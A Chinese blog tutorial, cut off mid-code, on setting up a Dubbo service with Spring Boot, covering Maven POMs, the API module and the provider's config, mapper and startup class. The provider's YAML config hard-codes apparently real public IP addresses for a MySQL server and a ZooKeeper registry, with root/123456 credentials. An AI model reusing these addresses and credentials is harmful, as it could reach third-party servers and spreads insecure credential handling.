</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-26T04:58:33.000Z" title="2023/4/26 12:58:33">2023-04-26</time>发表</span><span class="level-item"><time dateTime="2023-04-26T04:58:08.818Z" title="2023/4/26 12:58:08">2023-04-26</time>更新</span><span class="level-item">11 分钟读完 (大约1659个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/26/%E3%80%90Dubbo%E3%80%91%E4%BD%BF%E7%94%A8Dubbo%E6%95%B4%E5%90%88SpringBoot%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1/">【Dubbo】使用Dubbo整合SpringBoot搭建一个服务</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="dubbo使用dubbo整合springboot搭建一个服务"><a class="markdownIt-Anchor" href="#dubbo使用dubbo整合springboot搭建一个服务">#</a> 【Dubbo】使用 Dubbo 整合 SpringBoot 搭建一个服务</h1>
<h3 id="文章目录"><a class="markdownIt-Anchor" href="#文章目录">#</a> 文章目录</h3>
<ul>
<li><a href="#_1">开发前提</a></li>
<li><a href="#Springboot_3">构建 Springboot 项目</a></li>
<li><a href="#api_101">开发 api 模块</a></li>
<li><a href="#_145">开发生产者模块</a></li>
<li>
<ul>
<li><a href="#_147">第一步：导入依赖</a></li>
<li><a href="#_234">第二步：添加配置</a></li>
<li><a href="#_274">第三步：编写启动类</a></li>
<li><a href="#mapper_301">第四步：添加 mapper 接口</a></li>
<li><a href="#_330">第五步：实现接口：</a></li>
<li><a href="#controller_359">第六步：编写 controller 层接口</a></li>
</ul>
</li>
<li><a href="#_389">开发消费者模块</a></li>
<li>
<ul>
<li><a href="#_390">第一步：导入依赖</a></li>
<li><a href="#_433">第二步：添加配置</a></li>
<li><a href="#_451">第三步：编写启动类：</a></li>
<li><a href="#_471">第四步：编写调用生产者接口</a></li>
</ul>
</li>
<li><a href="#_505">测试</a></li>
</ul>
<h1 id="开发前提"><a class="markdownIt-Anchor" href="#开发前提">#</a> 开发前提</h1>
<p>由于 dubbo 的注册中心用的是 zookeeper，所以首先需要<a target="_blank" rel="noopener" href="https://blog.csdn.net/xzkwuli/article/details/120077241">安装 zookeeper</a>。</p>
<h1 id="构建springboot项目"><a class="markdownIt-Anchor" href="#构建springboot项目">#</a> 构建 Springboot 项目</h1>
<p>第一步：选择新建 project 或者 module，在界面中选择 maven 点击 next:<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9d940f3148f2466e8baaf9e1ca0ee2da.jpeg" alt="在这里插入图片描述"></p>
<p>第二步：填上项目的基本信息点击 Finish：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/0b67f36ca88c4c39a359cc8702ead495.jpeg" alt="在这里插入图片描述"></p>
<p>第三步：右击项目 new -&gt; Module:</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/96b98e7493684f6982c64e242049a21c.jpeg" alt="在这里插入图片描述"></p>
<p>第四步：在界面中选择 maven 点击 next:</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/8c10cd3965b542bfa3e5a9208359ea6a.jpeg" alt="在这里插入图片描述"></p>
<p>第五步：填上项目的基本信息点击 Finish：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/ab0158e03109413bb7ad0267943b386d.jpeg" alt="在这里插入图片描述"></p>
<p>第六步：重复第三，四，五步，分别创建项目需要的 dubbo-api,dubbo-provider,dubbo-customer 几个模块，如下：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9739ea601cbf4730b9a1430e6edfdf44.jpeg" alt="在这里插入图片描述"></p>
<p>第七步：导入父工程依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">    &lt;packaging&gt;pom&lt;/packaging&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;modules&gt;</span><br><span class="line">        &lt;module&gt;dubbo-provider&lt;/module&gt;</span><br><span class="line">        &lt;module&gt;dubbo-customer&lt;/module&gt;</span><br><span class="line">        &lt;module&gt;dubbo-api&lt;/module&gt;</span><br><span class="line">    &lt;/modules&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">        &lt;source.level&gt;1.8&lt;/source.level&gt;</span><br><span class="line">        &lt;target.level&gt;1.8&lt;/target.level&gt;</span><br><span class="line">        &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt;</span><br><span class="line">        &lt;skip_maven_deploy&gt;true&lt;/skip_maven_deploy&gt;</span><br><span class="line">        &lt;spring-boot-dependencies.version&gt;2.4.1&lt;/spring-boot-dependencies.version&gt;</span><br><span class="line">        &lt;spring-cloud-dependencies.version&gt;Dalston.SR4&lt;/spring-cloud-dependencies.version&gt;</span><br><span class="line">        &lt;junit.version&gt;4.12&lt;/junit.version&gt;</span><br><span class="line">        &lt;dubbo.version&gt;3.0.2.1&lt;/dubbo.version&gt;</span><br><span class="line">        &lt;spring-dubbo.version&gt;2.0.0&lt;/spring-dubbo.version&gt;</span><br><span class="line">        &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencyManagement&gt;</span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;!-- 统一jar版本管理，避免使用 spring-boot-parent --&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;spring-boot-dependencies.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;dubbo-bom&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;dubbo.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;!--dubbo 和  springboot 整合的包--&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;dubbo.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;lombok.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">    &lt;/dependencyManagement&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h1 id="开发api模块"><a class="markdownIt-Anchor" href="#开发api模块">#</a> 开发 api 模块</h1>
<p>user 实体类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.api.entity;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  10:56</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建本次测试的接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.api.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">selectUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="开发生产者模块"><a class="markdownIt-Anchor" href="#开发生产者模块">#</a> 开发生产者模块</h1>
<h2 id="第一步导入依赖"><a class="markdownIt-Anchor" href="#第一步导入依赖">#</a> 第一步：导入依赖</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">        &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--dubbo 与 spring-boot 整合包--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--springboot 启动核心包--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--springboot rest --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.3</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.3</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--mysql  的驱动--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;resources&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src/main/java&lt;/directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.properties&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                    &lt;include&gt;**/</span>*.xml&lt;/include&gt;</span><br><span class="line">                &lt;/includes&gt;</span><br><span class="line">                &lt;filtering&gt;<span class="literal">false</span>&lt;/filtering&gt;</span><br><span class="line">            &lt;/resource&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.yml&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                    &lt;include&gt;**/</span>*.xml&lt;/include&gt;</span><br><span class="line">                &lt;/includes&gt;</span><br><span class="line">                &lt;filtering&gt;<span class="literal">false</span>&lt;/filtering&gt;</span><br><span class="line">            &lt;/resource&gt;</span><br><span class="line">        &lt;/resources&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第二步添加配置"><a class="markdownIt-Anchor" href="#第二步添加配置">#</a> 第二步：添加配置</h2>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo-samples-privider-springCloud</span></span><br><span class="line">    <span class="comment">#配置数据源信息</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="comment">#配置连接数据库的各个信息</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="comment">#设置字符集</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://8.142.127.37:3306/test?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;transformedBitIsBoolean=true&amp;serverTimezone=GMT%2B8&amp;nullCatalogMeansCurrent=true&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="comment">#配置类型别名所对应的包</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.demo.provider.entity</span></span><br><span class="line">  <span class="comment">#配置SQL输出语句com.winsun.dataclean.mapper</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">com/demo/provider/mapper/*.xml</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">dubbo:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">zookeeper://43.139.86.193:2181</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">2000</span></span><br><span class="line">  <span class="attr">protocol:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">20890</span></span><br><span class="line">  <span class="comment"># 扫描 @DubboService 注解</span></span><br><span class="line">  <span class="attr">scan:</span></span><br><span class="line">    <span class="attr">base-packages:</span> <span class="string">com.demo.provider.service.impl</span></span><br></pre></td></tr></table></figure>
<h2 id="第三步编写启动类"><a class="markdownIt-Anchor" href="#第三步编写启动类">#</a> 第三步：编写启动类</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableDubbo</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.demo.provider.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderApp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ProviderApp.class,args);</span><br><span class="line">        System.out.println(<span class="string">&quot;生产者启动完毕&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步添加mapper接口"><a class="markdownIt-Anchor" href="#第四步添加mapper接口">#</a> 第四步：添加 mapper 接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:01</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">selectUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>xml:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.demo.provider.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;selectUserById&quot;</span> resultType=<span class="string">&quot;com.demo.api.entity.User&quot;</span>&gt;</span><br><span class="line">        select * from user <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第五步实现接口"><a class="markdownIt-Anchor" href="#第五步实现接口">#</a> 第五步：实现接口：</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.demo.provider.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.DubboService;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@DubboService</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span 